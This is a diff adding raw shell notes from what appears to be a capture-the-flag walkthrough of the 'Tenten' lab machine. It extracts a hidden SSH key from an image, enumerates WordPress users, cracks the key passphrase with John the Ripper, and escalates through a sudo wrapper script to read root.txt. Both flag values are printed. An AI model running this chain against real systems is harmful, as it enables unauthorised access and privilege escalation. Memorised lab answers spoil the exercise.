@@ -273,3 +273,75 @@ shell
 2017
 2018
 
+
+stegoveritas HackerAccessGranted.jpg
+file steghide_0143f8dec4a1adf3ae48561e283db92b.bin 
+steghide_0143f8dec4a1adf3ae48561e283db92b.bin: PEM RSA private key
+
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Tenten_10.10.10.10# wpscan --url 10.10.10.10 --enumerate p --enumerate t --enumerate u
+[i] User(s) Identified:
+
+[+] takis
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Rss Generator (Passive Detection)
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://10.10.10.10/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Tenten_10.10.10.10# /root/oscp/tools/john/run/ssh2john.py id_rsa > hash.txt
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Tenten_10.10.10.10# /root/oscp/tools/john/run/john hash.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 2 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+0g 0:00:00:00 DONE 1/3 (2022-05-28 14:03) 0g/s 351875p/s 351875c/s 351875C/s Rsaid_rsa1900..Rid1900
+Proceeding with wordlist:/root/oscp/tools/john/run/password.lst
+Enabling duplicate candidate password suppressor
+superpassword    (id_rsa)
+1g 0:00:00:00 DONE 2/3 (2022-05-28 14:03) 1.470g/s 425122p/s 425122c/s 425122C/s luchita..dawn3296
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Tenten_10.10.10.10# ssh -i id_rsa takis@10.10.10.10
+Enter passphrase for key 'id_rsa':
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+65 packages can be updated.
+39 updates are security updates.
+
+
+Last login: Fri May  5 23:05:36 2017
+/usr/bin/xauth:  file /home/takis/.Xauthority does not exist
+takis@tenten:~$ cat user.txt
+94d1b7de7e8875b758e417f34ffb696f
+
+takis@tenten:~$ sudo -l
+Matching Defaults entries for takis on tenten:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User takis may run the following commands on tenten:
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: /bin/fuckin
+takis@tenten:~$ file /bin/fuckin
+/bin/fuckin: Bourne-Again shell script, ASCII text executable
+takis@tenten:~$ uname -a
+Linux tenten 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+takis@tenten:~$ cat /bin/fuckin
+#!/bin/bash
+$1 $2 $3 $4
+takis@tenten:~$ sudo /bin/fuckin ls
+user.txt
+takis@tenten:~$ sudo /bin/fuckin cat /root/root.txt
+958acdb08cecdcdca503d5bdccedf427
+
